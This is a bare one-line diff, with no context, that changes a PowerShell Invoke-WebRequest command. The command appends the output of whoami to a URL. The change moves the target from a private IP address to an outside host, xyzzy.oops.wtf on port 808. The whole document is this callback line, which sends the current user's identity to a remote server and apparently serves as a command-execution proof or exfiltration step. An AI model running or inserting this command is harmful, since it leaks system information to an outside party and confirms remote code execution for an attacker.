@@ -1,1 +1,1 @@
-Invoke-WebRequest -UseBasicParsing -URI "http://192.168.1.157/$(whoami)"
+Invoke-WebRequest -UseBasicParsing -URI "http://xyzzy.oops.wtf:808/$(whoami)"
